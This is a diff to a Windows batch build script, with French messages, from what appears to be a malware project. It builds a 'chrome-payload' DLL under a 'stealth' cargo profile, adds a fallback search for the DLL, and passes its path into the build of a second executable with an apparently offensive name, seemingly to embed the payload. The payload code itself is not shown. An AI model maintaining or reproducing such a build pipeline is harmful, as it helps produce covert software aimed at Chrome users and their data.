@@ -91,14 +91,18 @@ echo.
 echo [1/2] chrome-payload...
 cargo build --profile stealth -p chrome-payload
 if errorlevel 1 exit /b 1
-if not exist "target\stealth\chrome_payload.dll" (
-    echo [X] chrome_payload.dll absent dans target\stealth\
+set "PAYLOAD_DLL="
+if exist "target\stealth\chrome_payload.dll" set "PAYLOAD_DLL=target\stealth\chrome_payload.dll"
+if not defined PAYLOAD_DLL if exist "target\stealth\deps\chrome_payload.dll" set "PAYLOAD_DLL=target\stealth\deps\chrome_payload.dll"
+if not defined PAYLOAD_DLL (
+    echo [X] chrome_payload.dll absent dans target\stealth\ ou deps\
     exit /b 1
 )
-echo [OK] chrome_payload.dll
+echo [OK] %PAYLOAD_DLL%
 
 echo.
 echo [2/2] jewish...
+set "CHROME_PAYLOAD_DLL=%~dp0%PAYLOAD_DLL%"
 cargo build --profile stealth -p jewish
 if errorlevel 1 exit /b 1
 if not exist "target\stealth\jewish.exe" (
